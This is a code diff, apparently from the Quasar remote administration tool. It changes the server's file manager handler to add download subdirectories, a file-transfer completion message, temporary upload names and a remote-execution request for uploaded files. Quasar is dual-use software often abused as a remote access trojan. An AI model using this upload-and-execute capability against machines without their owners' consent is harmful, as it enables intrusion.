@@ -134,18 +134,21 @@ namespace Quasar.Server.Messages
         /// Initializes a new instance of the <see cref="FileManagerHandler"/> class using the given client.
         /// </summary>
         /// <param name="client">The associated client.</param>
-        public FileManagerHandler(Client client) : base(true)
+        /// <param name="subDirectory">Optional sub directory name.</param>
+        public FileManagerHandler(Client client, string subDirectory = "") : base(true)
         {
             _client = client;
-            _baseDownloadPath = client.Value.DownloadDirectory;
+            _baseDownloadPath = Path.Combine(client.Value.DownloadDirectory, subDirectory);
         }
 
         /// <inheritdoc />
         public override bool CanExecute(IMessage message) => message is FileTransferChunk ||
                                                              message is FileTransferCancel ||
+                                                             message is FileTransferComplete ||
                                                              message is GetDrivesResponse ||
                                                              message is GetDirectoryResponse ||
-                                                             message is SetStatusFileManager;
+                                                             message is SetStatusFileManager ||
+                                                             message is DoRemoteExecutionResponse;
 
         /// <inheritdoc />
         public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
@@ -161,6 +164,9 @@ namespace Quasar.Server.Messages
                 case FileTransferCancel cancel:
                     Execute(sender, cancel);
                     break;
+                case FileTransferComplete complete:
+                    Execute(sender, complete);
+                    break;
                 case GetDrivesResponse drive:
                     Execute(sender, drive);
                     break;
@@ -169,6 +175,9 @@ namespace Quasar.Server.Messages
                     break;
                 case SetStatusFileManager status:
                     Execute(sender, status);
+                    break;
+                case DoRemoteExecutionResponse execResp:
+                    Execute(sender, execResp);
                     break;
             }
         }
@@ -235,8 +244,8 @@ namespace Quasar.Server.Messages
         /// Begins uploading a file to the client.
         /// </summary>
         /// <param name="localPath">The local path of the file to upload.</param>
-        /// <param name="remotePath">Save the uploaded file to this remote path.</param>
-        public void BeginUploadFile(string localPath, string remotePath)
+        /// <param name="remotePath">Save the uploaded file to this remote path. If empty, generate a temporary file name.</param>
+        public void BeginUploadFile(string localPath, string remotePath = "")
         {
             new Thread(() =>
             {
@@ -297,7 +306,7 @@ namespace Quasar.Server.Messages
                             return;
                         }
 
-                        // blocking sending might not be required, needs further testing
+                        // TODO: blocking sending might not be required, needs further testing
                         _client.SendBlocking(new FileTransferChunk
                         {
                             Id = id,
@@ -325,9 +334,6 @@ namespace Quasar.Server.Messages
                     return;
                 }
 
-                transfer.Status = "Completed";
-                OnFileTransferUpdated(transfer);
-                RemoveFileTransfer(transfer.Id);
                 _limitThreads.Release();
             }).Start();
         }
@@ -373,7 +379,8 @@ namespace Quasar.Server.Messages
         /// <param name="remotePath">The remote path used for starting the new process.</param>
         public void StartProcess(string remotePath)
         {
-            _client.Send(new DoProcessStart {ApplicationName = remotePath});
+            // TODO: change to remote execution handler
+            _client.Send(new DoRemoteExecution {FilePath = remotePath});
         }
 
         /// <summary>
@@ -428,17 +435,9 @@ namespace Quasar.Server.Messages
                 return;
             }
 
-            if (transfer.TransferredSize == transfer.Size)
-            {
-                transfer.Status = "Completed";
-                RemoveFileTransfer(transfer.Id);
-            }
-            else
-            {
-                decimal progress = Math.Round((decimal) ((double) transfer.TransferredSize / (double) transfer.Size * 100.0), 2);
-                transfer.Status = $"Downloading...({progress}%)";
-            }
-
+            decimal progress = Math.Round((decimal) ((double) transfer.TransferredSize / (double) transfer.Size * 100.0), 2);
+            transfer.Status = $"Downloading...({progress}%)";
+            
             OnFileTransferUpdated(transfer);
         }
 
@@ -461,6 +460,23 @@ namespace Quasar.Server.Messages
             }
         }
 
+        private void Execute(ISender client, FileTransferComplete message)
+        {
+            FileTransfer transfer;
+            lock (_syncLock)
+            {
+                transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == message.Id);
+            }
+
+            if (transfer != null)
+            {
+                transfer.RemotePath = message.FilePath; // required for temporary file names generated on the client
+                transfer.Status = "Completed";
+                OnFileTransferUpdated(transfer);
+                RemoveFileTransfer(transfer.Id);
+            }
+        }
+
         private void Execute(ISender client, GetDrivesResponse message)
         {
             if (message.Drives?.Length == 0)
@@ -477,6 +493,11 @@ namespace Quasar.Server.Messages
         private void Execute(ISender client, SetStatusFileManager message)
         {
             OnReport(message.Message);
+        }
+
+        private void Execute(ISender client, DoRemoteExecutionResponse message)
+        {
+            OnReport(message.Success ? "Process started successfully" : "Process failed to start");
         }
 
         /// <summary>
